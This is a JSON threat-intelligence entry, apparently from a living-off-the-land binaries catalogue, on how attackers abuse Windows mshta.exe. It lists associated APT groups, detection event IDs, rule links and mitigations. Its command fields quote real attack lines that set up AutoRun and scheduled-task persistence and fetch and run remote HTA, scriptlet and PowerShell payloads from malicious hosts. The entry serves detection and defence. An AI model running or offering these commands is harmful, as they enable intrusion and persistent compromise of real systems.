{
  "type": "lolbin",
  "version": 1,
  "id": "b4dd8057-8af8-4efe-af60-0a3ead2d7fdd",
  "created_by_ref": "@Nounou_Mbeiri",
  "created": "2023-09-10T00:00",
  "modified": "2023-09-10T00:00",
  "name": "Mshta.exe",
  "description": "Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.",
  "Required_privilege": [
    "User"
  ],
  "paths": [
    "c:\\windows\\system32\\mshta.exe",
    "c:\\windows\\syswow64\\mshta.exe"
  ],
  "hashe": "06B02D5C097C7DB1F109749C45F3F505",
  "associated_kill_chain_phases": [
    "TA0005:Defense Evasion:T1218.005"
  ],
  "capabilities": [
    "Alternate data streams",
    "Download",
    "Execute"
  ],
  "relationship": [
    {
      "associated_apts": [
        "APT29",
        "APT32",
        "FIN7",
        "Lazarus Group",
        " TA551",
        " Confucius",
        "SideCopy",
        "Sidewinder",
        "Earth Lusca",
        "Mustang Panda",
        "Gamaredon Group",
        "Inception",
        "Kimsuky",
        "LazyScripter",
        "MuddyWater"
      ],
      "associated_campaigns": [
        "C0015",
        "Operation Dust Storm"
      ],
      "associated_commands": [
        "HKCU\\Software\\Microsoft\\Command Processor\\AutoRun, value: \"powershell.exe mshta https://tdalpacafarm[.]com/files/kr/contents/Usoro.hta",
        "schtasks /create /sc MINUTE /tn \"Windows Error Reporting\" /tr \"mshta.exe about:'<script language=\"vbscript\" src=\"hxxp://110.10.179(.)65:80/download/microsoftp.jpg\">code close</script>'\" /mo 15 /F",
        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Command Processor\" /v AutoRun /t REG_SZ /d \"powershell.exe start-process -windowstyle hidden -filepath mshta.exe https://bit-albania[.]com/[REDACTED]/Drfwj.hta\" /f",
        "Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c Invoke-Command -ScriptBlock { schtasks /create /TN AutomaticChromeUpdater /TR 'mshta http://hpsj.firewall-gateway.net:8080/MicrosoftUpdate' /SC minute /mo 60} \"C:\\WINDOWS\\system32\\schtasks.exe\" /create /TN AutomaticChromeUpdater /TR \"mshta http://hpsj.firewall-gateway.net:8080/MicrosoftUpdate\" /SC minute /mo 60",
        "shellObj.Run \"forfiles /p c:\\windows /m HelpPane.exe /c \"\"mshta C:\\WMAuthorization\\WMPlaybackSrv \"\"https://markettrendingcenter.com/member.htm\", 0, True",
        "C:\\Windows\\System32\rundll32.exe http://hpsj.firewall-gateway.net:8080/MicrosoftUpdate?PPVXCF8Y4U=2368b7b9facb4a3b8acf72d29ea28704;UGH09GLI5P=;\\..\\..\\..\\./mshtml,RunHTMLApplication mshta.exe http[:]//malicioussite.com/superlegit.hta",
        "mshta vbscript:(CreateObject(“WS”+”C”+”rI”+”Pt.ShEll”)).Run(“powershell”,1,True)(window.close)",
        "mshta javascript:a=GetObject(“script:http://c2[.]com/cmd.sct”).Exec()"
      ],
      "pre_and_next_related_cmd": [
        {
          "pre_cmd_event": [
            "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"#OneDrive\" /t REG_SZ /d \"cmd /c powershell -w hidden \"Add-Type -AssemblyName System.Core;IEX (New-ObjectNet.WebClient).DownloadString('http://hpsj.firewall-gateway.net:80/hpjs.php');\"\"",
            ""
          ],
          "next_cmd_event": [
            "Set objShell = CreateObject (\"WScript.Shell\") intReturn = objShell.Run(\"powershell —eXECUt BYpASS -COm \"IEX ({new-object net.webclient).downloadstring('http://110.18.179.65:88/download/microsoft.jpg'))",
            "wscript.exe /nologo",
            "Set wShell=CreateObject(\"WScript.Shell\"):retu=wShell.run(\"cmd.exe /c taskkill /im cmd.exe\",0,true)",
            "wShell=new ActiveXObject(\"WScript.Shell\");retu=wShell.run(\"cmd.exe /c taskkill /im cmd.exe\",0,true)"
          ]
        }
      ]
    }
  ],
  "platforms": [
    "windows"
  ],
  "detections": [
    {
      "eventsid": [
        {
          "sysmon": [
            "T1218:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1",
            "T1218:file:file_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:11",
            "T1218:network_traffic:network_connection_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:3"
          ],
          "windows": [
            "T1218:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688",
            "T1218:file:file access:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4663",
            "T1218:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5156",
            "T1218:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5157"
          ]
        }
      ],
      "sigma_rules": [
        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml",
        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_mshta_susp_execution.yml",
        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_mshta_susp_child_processes.yml"
      ],
      "other_rules": [
        "https://raw.githubusercontent.com/splunk/security_content/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_url_in_command_line.yml",
        "https://raw.githubusercontent.com/elastic/detection-rules/main/rules/windows/defense_evasion_mshta_beacon.toml",
        "https://raw.githubusercontent.com/elastic/detection-rules/main/rules/_deprecated/defense_evasion_mshta_making_network_connections.toml"
      ]
    }
  ],
  "related_CVE": [
    "CVE-2017-11882",
    "CVE-2017-0199",
    "CVE-2018-0802"
  ],
  "mitigations": [
    "Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life. Use application whitelisting configured to block execution of mshta.exe if it is not required for a given system or network to prevent potential misuse by adversaries.",
    "Change Default Applications: One of the easiest things you can implement is to change the default applications for files with an .hta extension from mshta.exe to a plain text editor such as notepad. This can help keep users from unwittingly double-clicking a malicious .hta attachment",
    "Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries. Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life.",
    "Block execution of code on a system through application control, and/or script blocking."
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1218/005/",
    "https://app.tidalcyber.com/technique/d54c50df-3cb8-4fff-86c4-ae5be57937ad/",
    "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
    "https://strontic.github.io/xcyclopedia/library/bitsadmin.exe-01AAB62D5799F75B0D69EB29C1CA6855.html"
  ]
}